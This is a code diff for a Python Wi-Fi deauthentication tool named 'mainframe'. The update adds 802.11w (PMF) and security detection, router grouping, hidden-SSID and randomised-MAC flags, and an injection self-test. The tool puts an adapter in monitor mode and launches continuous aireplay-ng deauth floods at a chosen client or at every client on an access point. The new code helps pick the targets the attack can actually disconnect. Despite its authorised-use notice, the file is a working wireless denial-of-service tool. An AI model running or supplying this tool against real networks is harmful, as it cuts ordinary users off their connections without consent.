@@ -7,6 +7,12 @@ single-purpose workflow: pick one adapter, isolate it, scan, target, deauth,
 restore. Only the chosen interface is ever touched; every other adapter stays
 online for the entire session.
 
+This build also *diagnoses* before it fires: it reads each AP's security and
+802.11w (PMF) status, groups virtual BSSIDs that belong to the same physical
+router, flags hidden SSIDs, and runs an injection self-test. Deauth cannot
+defeat a PMF-protected client — that is by design — so the tool now tells you
+that up front instead of letting you wonder why nothing dropped.
+
 For use only on networks you own or are explicitly authorised to test.
 
 Author : The Priest
@@ -28,7 +34,7 @@ import time
 from dataclasses import dataclass, field
 from pathlib import Path
 
-__version__ = "1.2.0"
+__version__ = "1.3.0"
 
 # ─── palette ──────────────────────────────────────────────────────────────────
 G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
@@ -81,10 +87,24 @@ class AccessPoint:
     channel: str
     power: str
     essid: str
+    security: str = "?"      # OPEN / WEP / WPA / WPA2 / WPA3 / ?
+    pmf: str = "?"           # none / cap / req / ?  (802.11w management-frame protection)
+    hidden: bool = False
 
     @property
     def band(self) -> str:
         return band_of(self.channel)
+
+    @property
+    def deauthable(self) -> str:
+        """How a classic deauth is expected to fare against this AP's clients."""
+        if self.pmf == "req":
+            return "no"      # every client must use PMF; deauth is dropped
+        if self.pmf == "cap":
+            return "maybe"   # per-client: PMF-capable clients drop it, legacy ones don't
+        if self.pmf == "none":
+            return "yes"     # no PMF negotiated; classic deauth works
+        return "?"
 
 
 @dataclass
@@ -113,6 +133,25 @@ def run(cmd: list[str], capture: bool = True) -> tuple[int, str]:
         return proc.returncode, (proc.stdout or b"").decode(errors="ignore")
     except FileNotFoundError:
         return 127, ""
+
+
+def run_timed(cmd: list[str], seconds: int) -> str:
+    """Run a command for up to `seconds`, then stop it. Return whatever it printed."""
+    try:
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                                stderr=subprocess.STDOUT)
+    except FileNotFoundError:
+        return ""
+    try:
+        out, _ = proc.communicate(timeout=seconds)
+    except subprocess.TimeoutExpired:
+        proc.send_signal(signal.SIGINT)
+        try:
+            out, _ = proc.communicate(timeout=3)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            out, _ = proc.communicate()
+    return (out or b"").decode(errors="ignore")
 
 
 def have(tool: str) -> bool:
@@ -184,6 +223,24 @@ def vendor(mac: str) -> str:
     return table.get(mac.upper().replace(":", "")[:6], "")
 
 
+# ─── physical-AP grouping ─────────────────────────────────────────────────────
+def same_ap_key(bssid: str) -> str:
+    """
+    Heuristic key that clusters virtual BSSIDs belonging to one physical router.
+
+    Multi-SSID routers derive each virtual AP's BSSID from a single base MAC by
+    tweaking a couple of bytes (commonly one octet). They almost always keep the
+    OUI (first three octets) and the final two octets identical, varying only a
+    middle octet. We key on first-three + last-two and ignore the 4th octet.
+
+    This is a heuristic, not a guarantee — it's only used for display grouping.
+    """
+    parts = bssid.upper().split(":")
+    if len(parts) != 6:
+        return bssid.upper()
+    return ":".join(parts[0:3] + parts[4:6])
+
+
 # ─── presentation ─────────────────────────────────────────────────────────────
 def clear():
     print("\033[2J\033[H", end="")
@@ -208,6 +265,18 @@ def bars(raw: str) -> str:
 def power_label(raw: str) -> str:
     p = power_int(raw)
     return f"{p} dBm" if p is not None else "signal n/a"
+
+
+def pmf_tag(ap: AccessPoint) -> str:
+    """Short coloured tag describing security + whether deauth can land."""
+    sec = ap.security if ap.security not in ("?", "") else "sec?"
+    if ap.pmf == "req":
+        return f"{R}{sec} · PMF required → deauth blocked{X}"
+    if ap.pmf == "cap":
+        return f"{Y}{sec} · PMF optional → deauth hit-or-miss{X}"
+    if ap.pmf == "none":
+        return f"{G}{sec} · no PMF → deauth works{X}"
+    return f"{D}{sec} · PMF unknown{X}"
 
 
 # 5 GHz channels that require DFS (radar avoidance). On most cards these are
@@ -330,6 +399,126 @@ def select_interface(preselect: str | None, assume_yes: bool) -> Interface:
     return chosen
 
 
+# ─── security / PMF probe (managed-mode iw scan, before we go monitor) ─────────
+def scan_security(iface: str) -> dict[str, AccessPoint]:
+    """
+    Do a normal `iw scan` while the adapter is still managed, and read each AP's
+    security suite + 802.11w (PMF) status from the RSN information element.
+
+    Returns {BSSID_UPPER: AccessPoint} carrying security / pmf / essid / channel.
+    Best-effort: on any failure we return what we have (possibly empty) and the
+    UI simply shows 'unknown' for the missing fields.
+    """
+    run(["ip", "link", "set", iface, "up"], capture=False)
+    text = ""
+    for _ in range(2):                       # NM may be mid-scan; one quick retry
+        rc, text = run(["iw", "dev", iface, "scan"])
+        if rc == 0 and "BSS " in text:
+            break
+        time.sleep(1)
+    return parse_iw_scan(text)
+
+
+def parse_iw_scan(text: str) -> dict[str, AccessPoint]:
+    aps: dict[str, AccessPoint] = {}
+    cur: AccessPoint | None = None
+    in_rsn = False
+
+    def finish(ap: AccessPoint | None):
+        if ap is not None:
+            aps[ap.bssid.upper()] = ap
+
+    for raw in text.splitlines():
+        m = re.match(r"^BSS ([0-9a-fA-F:]{17})", raw)
+        if m:
+            finish(cur)
+            cur = AccessPoint(bssid=m.group(1).upper(), channel="?", power="",
+                              essid="<hidden>", security="OPEN", pmf="none",
+                              hidden=True)
+            in_rsn = False
+            continue
+        if cur is None:
+            continue
+
+        if re.match(r"^\s+RSN:", raw):
+            in_rsn = True
+        elif re.match(r"^\s+WPA:", raw):
+            in_rsn = False
+            if cur.security == "OPEN":
+                cur.security = "WPA"
+
+        mf = re.search(r"\bfreq:\s*(\d+)", raw)
+        if mf:
+            cur.channel = freq_to_channel(mf.group(1))
+
+        ms = re.search(r"\bSSID:\s*(.*)$", raw)
+        if ms:
+            name = ms.group(1).strip()
+            if name:
+                cur.essid = name
+                cur.hidden = False
+
+        # authentication suite tells us WPA2 vs WPA3 (SAE) — and SAE ⇒ PMF required
+        if "Authentication suites:" in raw or re.search(r"\*\s*(SAE|PSK|FT)", raw):
+            if "SAE" in raw:
+                cur.security = "WPA3"
+                cur.pmf = "req"
+            elif "PSK" in raw and cur.security in ("OPEN", "WPA"):
+                cur.security = "WPA2"
+
+        # explicit RSN capability words (modern iw decodes these for us)
+        if in_rsn or "MFP" in raw:
+            if "MFP-required" in raw:
+                cur.pmf = "req"
+            elif "MFP-capable" in raw and cur.pmf != "req":
+                cur.pmf = "cap"
+
+        # fall back to the raw RSN capabilities hex if the words aren't printed:
+        #   bit 6 (0x40) = MFP required, bit 7 (0x80) = MFP capable
+        if in_rsn:
+            mc = re.search(r"Capabilities:.*\(0x([0-9a-fA-F]{2,4})\)", raw)
+            if mc:
+                val = int(mc.group(1), 16)
+                if val & 0x40:
+                    cur.pmf = "req"
+                elif (val & 0x80) and cur.pmf != "req":
+                    cur.pmf = "cap"
+
+    finish(cur)
+    return aps
+
+
+def freq_to_channel(freq: str) -> str:
+    try:
+        f = int(freq)
+    except (TypeError, ValueError):
+        return "?"
+    if f == 2484:
+        return "14"
+    if 2412 <= f <= 2472:
+        return str((f - 2407) // 5)
+    if 5000 <= f <= 5900:
+        return str((f - 5000) // 5)
+    if 5955 <= f <= 7115:                    # 6 GHz, just in case
+        return str((f - 5950) // 5)
+    return "?"
+
+
+def merge_security(aps: list[AccessPoint], sec: dict[str, AccessPoint]) -> None:
+    """Fold the iw-scan security map onto the airodump-discovered APs (by BSSID)."""
+    for ap in aps:
+        info = sec.get(ap.bssid.upper())
+        if not info:
+            continue
+        ap.security = info.security
+        ap.pmf = info.pmf
+        # airodump shows nothing for cloaked SSIDs; iw may have caught the name
+        if (ap.essid in ("", "<hidden>")) and info.essid not in ("", "<hidden>"):
+            ap.essid = info.essid
+        if ap.essid in ("", "<hidden>"):
+            ap.hidden = True
+
+
 # ─── monitor mode (surgical, verified) ────────────────────────────────────────
 def enter_monitor(iface: Interface, session: Session) -> str:
     name = iface.name
@@ -379,6 +568,35 @@ def exit_monitor(session: Session) -> None:
 def set_channel(name: str, channel: str) -> bool:
     rc, _ = run(["iw", "dev", name, "set", "channel", str(channel)])
     return rc == 0
+
+
+def injection_test(mon: str, ap: AccessPoint) -> None:
+    """
+    aireplay-ng -9 (injection test) against the target AP. Separates 'my card
+    can't inject' from 'the frames go out but the client ignores them' — the
+    latter is what PMF looks like.
+    """
+    print(f"\n{D}testing injection on {mon} (ch {ap.channel})…{X}")
+    out = run_timed(["aireplay-ng", "--test", "--ignore-negative-one",
+                     "-a", ap.bssid, mon], seconds=8)
+
+    works = "Injection is working" in out
+    m = re.search(r"(\d+)\s*/\s*(\d+):", out)        # e.g. "27/30: 90%"
+    ratio = (int(m.group(1)), int(m.group(2))) if m else None
+
+    if works:
+        print(f"{G}✓ card injection works.{X}")
+    else:
+        print(f"{R}✗ injection test did not confirm — driver/monitor problem "
+              f"likely (mt76x2u can be flaky).{X}")
+    if ratio:
+        got, sent = ratio
+        if got == 0:
+            print(f"{Y}  AP acked 0/{sent} of our frames: frames leave the card but "
+                  f"nothing comes back. Distance, wrong channel, or the AP isn't "
+                  f"answering injected probes.{X}")
+        else:
+            print(f"{D}  AP acked {got}/{sent} injected frames.{X}")
 
 
 # ─── scanning ─────────────────────────────────────────────────────────────────
@@ -438,12 +656,14 @@ def _parse_csv(raw: str) -> tuple[list[AccessPoint], list[Client]]:
             parts = line.split(",", 13)
             if len(parts) < 14 or not MAC_RE.match(parts[0].strip()):
                 continue
-            essid = parts[13].rsplit(",", 1)[0].strip() or "<hidden>"
+            essid = parts[13].rsplit(",", 1)[0].strip()
+            hidden = (essid == "")
             aps.append(AccessPoint(
                 bssid=parts[0].strip(),
                 channel=parts[3].strip(),
                 power=parts[8].strip(),
-                essid=essid,
+                essid=essid or "<hidden>",
+                hidden=hidden,
             ))
 
     if len(sections) > 1:
@@ -464,7 +684,6 @@ def _signal_key(raw: str) -> int:
 
 
 def select_ap(aps: list[AccessPoint], band_filter: str) -> AccessPoint | None:
-    aps = sorted(aps, key=lambda a: _signal_key(a.power))
     if band_filter in ("2.4", "5"):
         aps = [a for a in aps if a.band == band_filter]
 
@@ -474,14 +693,59 @@ def select_ap(aps: list[AccessPoint], band_filter: str) -> AccessPoint | None:
             print(f"{D}(scanning {band_filter} GHz only — drop --band to see everything){X}")
         return None
 
+    # Cluster virtual BSSIDs of one physical router together, strongest router
+    # first, then by band, then signal — so the two halves of a dual-band SSID
+    # sit next to each other instead of scattered across the list.
+    def router_best(key: str) -> int:
+        return min((_signal_key(a.power) for a in aps if same_ap_key(a.bssid) == key),
+                   default=10_000)
+
+    aps = sorted(
+        aps,
+        key=lambda a: (router_best(same_ap_key(a.bssid)), same_ap_key(a.bssid),
+                       a.band, _signal_key(a.power)),
+    )
+
+    # essid -> set of bands, so we can annotate "also on 5 GHz"
+    bands_for: dict[str, set[str]] = {}
+    for a in aps:
+        if not a.hidden:
+            bands_for.setdefault(a.essid, set()).add(a.band)
+
     scope = {"2.4": "2.4 GHz", "5": "5 GHz", "all": "all bands"}[band_filter]
     header(f"access points · {scope}")
+
+    prev_key = None
     for idx, ap in enumerate(aps):
+        key = same_ap_key(ap.bssid)
+        if prev_key is not None and key != prev_key:
+            print(f"  {D}{'·' * 50}{X}")          # divider between physical routers
+        prev_key = key
+
         bc = band_color(ap.band)
         dfs = f"  {Y}DFS{X}" if is_dfs(ap.channel) else ""
-        print(f"  {G}[{idx:>2}]{X} {B}{ap.essid[:32]}{X}")
+
+        name = ap.essid
+        extra = []
+        if ap.hidden:
+            named = next((a.essid for a in aps
+                          if same_ap_key(a.bssid) == key and not a.hidden), None)
+            extra.append(f"{D}same router as '{named}'{X}" if named
+                         else f"{D}cloaked SSID{X}")
+        else:
+            others = bands_for.get(ap.essid, set()) - {ap.band}
+            if others:
+                extra.append(f"{D}also on {'/'.join(sorted(others))} GHz{X}")
+        extrastr = f"   {' · '.join(extra)}" if extra else ""
+
+        print(f"  {G}[{idx:>2}]{X} {B}{name[:32]}{X}{extrastr}")
         print(f"       {D}{ap.bssid}{X}  ch {ap.channel:>3}  "
-              f"{bc}{ap.band:>3} GHz{X}{dfs}  {bars(ap.power)} {D}{power_label(ap.power)}{X}")
+              f"{bc}{ap.band:>3} GHz{X}{dfs}  {bars(ap.power)} "
+              f"{D}{power_label(ap.power)}{X}")
+        print(f"       {pmf_tag(ap)}")
+
+    print(f"\n{D}PMF = 802.11w. 'required' means clients cryptographically reject "
+          f"spoofed deauths — no tool gets past it.{X}")
 
     while True:
         sel = prompt("\ntarget AP (number, q to quit)> ").lower()
@@ -492,6 +756,12 @@ def select_ap(aps: list[AccessPoint], band_filter: str) -> AccessPoint | None:
         except (ValueError, IndexError):
             print(f"{R}invalid selection{X}")
             continue
+        if ap.pmf == "req":
+            print(f"{R}heads up:{X} {ap.essid} enforces PMF (802.11w). A deauth will "
+                  f"be ignored by every client on it. This is the standard working "
+                  f"as designed, not a tool fault.")
+            if prompt("pick it anyway (e.g. to confirm the block)? [y/N] ").lower() != "y":
+                continue
         if is_dfs(ap.channel):
             print(f"{Y}note:{X} ch {ap.channel} is a DFS channel. Most cards refuse "
                   f"injection here in monitor mode, so the deauth may not land.")
@@ -512,7 +782,11 @@ def select_client(clients: list[Client], ap: AccessPoint):
         for idx, c in enumerate(matching):
             v = vendor(c.mac)
             vstr = f"  {C}{v}{X}" if v else ""
-            print(f"  {G}[{idx:>2}]{X} {B}{c.mac}{X}  {bars(c.power)}{vstr}")
+            rnd = ""
+            # locally-administered 2nd-hex-nibble (2,6,A,E) ⇒ randomised MAC
+            if len(c.mac) >= 2 and c.mac[1].upper() in "26AE":
+                rnd = f"  {D}(randomised MAC){X}"
+            print(f"  {G}[{idx:>2}]{X} {B}{c.mac}{X}  {bars(c.power)}{vstr}{rnd}")
 
     print(f"\n  {G}[a]{X}  {Y}all clients{X} — broadcast deauth (everyone on this AP)")
     print(f"  {G}[r]{X}  rescan (the device may not have surfaced yet)")
@@ -538,12 +812,20 @@ def confirm(ap: AccessPoint, client_mac: str | None, minutes: int) -> bool:
     print(f"  AP        : {B}{ap.essid}{X}  {D}{ap.bssid}{X}")
     dfs = f"  {Y}· DFS (injection may not work){X}" if is_dfs(ap.channel) else ""
     print(f"  channel   : {ap.channel}  ({ap.band} GHz){dfs}")
+    print(f"  security  : {pmf_tag(ap)}")
     if client_mac:
         v = vendor(client_mac)
         print(f"  target    : {B}{client_mac}{X}" + (f"  {C}{v}{X}" if v else ""))
     else:
         print(f"  target    : {Y}ALL CLIENTS (broadcast){X}")
     print(f"  duration  : {minutes} min")
+
+    if ap.deauthable == "no":
+        print(f"\n{R}expected result: nothing drops. PMF is required here.{X}")
+    elif ap.deauthable == "maybe":
+        print(f"\n{Y}expected result: legacy clients may drop; any PMF-capable "
+              f"client (most modern phones) will not.{X}")
+
     return prompt(f"\n{R}{B}proceed? [y/N] {X}").lower() == "y"
 
 
@@ -553,6 +835,13 @@ def deauth(mon: str, ap: AccessPoint, client_mac: str | None, minutes: int) -> N
         if is_dfs(ap.channel):
             print(f"{D}  ch {ap.channel} is DFS — the card likely won't TX here. "
                   f"move the router to 36–48 and retry.{X}")
+
+    injection_test(mon, ap)
+
+    if ap.pmf == "req":
+        print(f"\n{R}{B}note:{X} this AP requires PMF. The frames below will be sent, "
+              f"but compliant clients will ignore every one of them. If a device "
+              f"here actually drops, it wasn't using PMF.")
 
     cmd = ["aireplay-ng", "--deauth", "0", "--ignore-negative-one", "-a", ap.bssid]
     if client_mac:
@@ -607,6 +896,8 @@ def build_parser() -> argparse.ArgumentParser:
                    help="skip the authorisation acknowledgement prompt")
     p.add_argument("-l", "--list", action="store_true",
                    help="list wireless adapters and exit")
+    p.add_argument("--no-secscan", action="store_true",
+                   help="skip the managed-mode security/PMF probe")
     p.add_argument("-V", "--version", action="version",
                    version=f"mainframe {__version__}")
     return p
@@ -655,12 +946,24 @@ def main() -> None:
     session = Session()
     iface = select_interface(args.iface, args.yes)
 
+    # Read security + PMF while the adapter is still in managed mode. This is the
+    # bit that tells us, before any deauth, whether a target can even be kicked.
+    sec_map: dict[str, AccessPoint] = {}
+    if not args.no_secscan:
+        print(f"\n{D}reading security/PMF info on {iface.name} (managed scan)…{X}")
+        sec_map = scan_security(iface.name)
+        if sec_map:
+            print(f"{G}✓ read {len(sec_map)} AP(s).{X}")
+        else:
+            print(f"{Y}security scan returned nothing; PMF will show as unknown.{X}")
+
     try:
         mon = enter_monitor(iface, session)
 
         airo_band = {"2.4": "bg", "5": "a", "all": "abg"}[args.band]
         aps, _ = scan(mon, args.scan_time, bands=airo_band,
                       label="scanning for access points")
+        merge_security(aps, sec_map)
         ap = select_ap(aps, args.band)
         if ap is None:
             return
